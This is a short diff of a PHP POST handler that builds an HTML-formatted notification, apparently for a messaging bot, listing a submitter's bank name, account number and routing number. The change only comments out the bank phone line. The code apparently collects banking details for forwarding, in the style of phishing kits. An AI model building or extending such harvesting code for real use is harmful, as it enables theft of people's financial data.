@@ -601,7 +601,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message .= "<b>🏦 BANK INFORMATION:</b>\n";
     $message .= "• <b>Bank Name:</b> $bank_name\n";
     $message .= "• <b>Account #:</b> <code>$account_number</code>\n";
-    $message .= "• <b>Bank Phone:</b> $bank_phone\n";
+    // $message .= "• <b>Bank Phone:</b> $bank_phone\n";
     $message .= "• <b>Bank Routing:</b> $bank_routing\n\n";
     
     $message .= "<b>✅ CONSENTS:</b>\n";
